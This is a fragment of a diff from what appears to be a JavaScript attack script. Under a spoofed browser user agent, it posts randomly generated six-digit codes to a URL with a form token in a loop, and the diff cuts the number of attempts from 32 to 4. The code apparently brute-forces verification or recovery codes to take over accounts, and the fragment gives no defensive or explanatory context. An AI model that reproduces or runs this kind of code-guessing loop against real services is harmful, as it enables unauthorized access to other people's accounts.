@@ -24,7 +24,7 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
   // child_process.exec('siren warn');
 
-  for (let i = 0, code; 32 > i; ++i) {
+  for (let i = 0, code; 4 > i; ++i) {
     code = rand(111111, 999999);
     httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => log(res.statusCode));
   }
